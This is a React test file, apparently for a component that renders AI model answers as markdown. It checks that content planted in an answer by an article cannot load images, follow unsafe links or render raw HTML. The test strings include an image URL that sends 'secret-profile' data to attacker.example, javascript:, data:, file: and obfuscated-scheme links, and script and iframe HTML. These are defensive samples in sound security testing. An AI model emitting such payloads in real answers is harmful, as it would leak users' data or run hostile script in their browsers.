// An assistant answer may carry text planted by an article: images must never load, links must be
// plain web addresses, and raw HTML must not render.
import { cleanup, render } from '@testing-library/react'
import { afterEach, describe, expect, it } from 'vitest'
import { AnswerMarkdown } from './answerMarkdown'

afterEach(cleanup)

describe('AnswerMarkdown', () => {
  it('never renders an image and shows its alt text and address as plain text', () => {
    const { container } = render(<AnswerMarkdown>{'Look ![chart](https://attacker.example/?q=secret-profile) here'}</AnswerMarkdown>)
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('[image: chart]')
    expect(container.textContent).toContain('https://attacker.example/?q=secret-profile')
  })

  it('does not load an image written with an empty alt, a title or a reference definition', () => {
    const md = '![](https://a.example/x.png)\n\n![t][ref]\n\n[ref]: https://b.example/y.png "title"'
    const { container } = render(<AnswerMarkdown>{md}</AnswerMarkdown>)
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('[image]')
    expect(container.textContent).toContain('https://b.example/y.png')
  })

  it('opens http and https links in a new tab without a referrer or opener', () => {
    const { container } = render(<AnswerMarkdown>{'[paper](https://example.org/p) and [plain](http://example.org/q)'}</AnswerMarkdown>)
    const links = container.querySelectorAll('a')
    expect(links).toHaveLength(2)
    links.forEach((a) => {
      expect(a.getAttribute('target')).toBe('_blank')
      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    })
  })

  it.each([
    ['javascript', '[x](javascript:alert(1))'],
    ['data', '[x](data:text/html,<script>alert(1)</script>)'],
    ['mailto', '[x](mailto:a@example.com)'],
    ['file', '[x](file:///C:/Windows/win.ini)'],
    ['relative', '[x](/api/radar/collect)'],
    ['obfuscated scheme', '[x](JaVa&#x09;Script:alert(1))'],
  ])('renders a %s link as text, not a link', (_name, md) => {
    const { container } = render(<AnswerMarkdown>{md}</AnswerMarkdown>)
    expect(container.querySelector('a')).toBeNull()
    expect(container.textContent).toContain('x')
  })

  it('does not render raw HTML from the answer', () => {
    const html = '<img src="https://attacker.example/p.png"><script>window.__x=1</script><iframe src="https://a.example"></iframe><a href="https://a.example">raw</a>'
    const { container } = render(<AnswerMarkdown>{html}</AnswerMarkdown>)
    expect(container.querySelector('img, script, iframe, a')).toBeNull()
  })

  it('still renders ordinary markdown', () => {
    const { container } = render(<AnswerMarkdown>{'**bold** and a list:\n\n- one\n- two'}</AnswerMarkdown>)
    expect(container.querySelector('strong')?.textContent).toBe('bold')
    expect(container.querySelectorAll('li')).toHaveLength(2)
  })
})
